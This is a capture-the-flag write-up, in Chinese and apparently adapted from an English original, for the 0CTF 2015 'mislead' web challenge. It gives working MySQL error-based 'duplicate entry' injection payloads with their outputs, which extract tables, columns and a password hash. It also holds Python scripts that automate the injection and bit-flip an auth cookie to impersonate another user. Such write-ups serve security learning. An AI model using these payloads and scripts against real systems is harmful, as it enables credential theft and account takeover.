---
title: mis_lead
author: tank96a
layout: post
categories:
  - article
tags:
  - web
---

[原文链接](http://www.pwntester.com/blog/2015/03/30/0ctf-2015-mislead-web-300/)

 `Duplicate entry technique` 经典注入语句
 
Get the DB:
{% highlight php %}
username=pwner10&password='),(select 1 FROM(select count(*),concat((select (select concat(database())) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a) );#&submit=Submit
{% endhighlight %}

Output:

SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry `'mislead1'` for key 'group_key'<br>maybe another username?  

Get the tables:
{% highlight php %}
username=pwner10&password='),(select 1 from (select count(*),concat((select(select concat(cast(table_name as char),0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)  
 );#&submit=Submit
{% endhighlight %}
Output:

SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry `'users~1'` for key 'group_key'<br>maybe another username?  

Get the columns:
{% highlight php %}
username=pwner10&password='),(select 1 from (select count(*),concat((select(select concat(cast(column_name as char),0x7e)) from information_schema.columns where table_name='users' limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)  );#&submit=Submit  
{% endhighlight %}
Output:

SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry `'id~1'` for key 'group_key'<br>maybe another username?

SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry `'username~1'` for key 'group_key'<br>maybe another username?

SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry `'password~1'` for key 'group_key'<br>maybe another username?  

Get the first user:
{% highlight php %}
 username=pwner10&password='),(select 1 from (select count(*),concat((select(select concat(cast(concat(username,0x7e,password) as char),0x7e)) from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)   );#&submit=Submit
{% endhighlight %}
Output:

SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry `'0ops~13096de41fe9a97b700d4d9e21665484~1'` for key 'group_key'<br>maybe another username?  

We decide to flip bits in the cookie to see if which byte can change the login name, then found the 14th byte make it. the logging message changes and our names is modified. Cool! So we can try to bit-flip the cookie and get the username to be 0ops. For that, the easiest way is to register a name very similar (just one letter off) and bit-flip that byte until we get the right name.

在cookies中寻找关键字节的开始位置，用户名会随着这个字节的改变而改变，这个就是可以爆破的位置。
先爆破一个和目标用户名只差一个字母的用户的cookies值：

{% highlight python %}
import requests  
url = 'http://202.112.26.101//mislead/register.php'  
for i in xrange(4000):  
    data = {
        'username': 'pwntester',
        'password': "'),(select 1 from (select count(*),concat((select(select concat(cast(concat(username,0x7e,password) as char),0x7e)) from users limit %d,1),floor(rand(0)*2))x from information_schema.tables group by x)a));#" % i,
        'submit': 'Submit',
    }
    res = requests.post(url, data=data)
    if "ops~" in res.text:
        print res.text
{% endhighlight %}

先找到cookies中的关键字节位置，然后在该位置爆破出目标cookies值。

{% highlight python %}
import requests  
from base64 import b64decode, b64encode  
#from hexdump import hexdump  
import sys  
import string

url = 'http://202.112.26.101//mislead/index.php'  
OopsCookie = 'YWVkMTM0MjNjYWZkY2IyMDgxODExNDcwM2E1ODY2NWZhYTAzMzY3ZjQ1ZjFjMjQxNmQxNjRjNGM1ZGM0ZDEwZA=='  
binCookie = b64decode(OopsCookie).decode("hex")  
bytelength = len(binCookie)

def is_printable(s):  
    for ch in s:
        if not ch in string.printable:
            return False
    return True

def flip_byte(msg, pos, byte=0x10):  
    msg = msg[:pos] + chr(ord(msg[pos]) ^ byte) + msg[pos+1:]
    return msg

for i in xrange(bytelength):  
    res = requests.get(url, cookies={'auth': b64encode(flip_byte(binCookie, i).encode("hex"))})
    print i, res.text
    if "Hello" in res.text and "Oops" not in res.text:
        for c in xrange(256):
            res = requests.get(url, cookies={'auth': b64encode(flip_byte(binCookie, i, c).encode("hex"))})
            if is_printable(res.text):
                print i, c, res.text
{% endhighlight %}

感想：不能简单从cookies的长度来判断加密类型，容易陷入思维定势；经典的注入语句要记住；requests这个linux下的python模块确实简单好用。




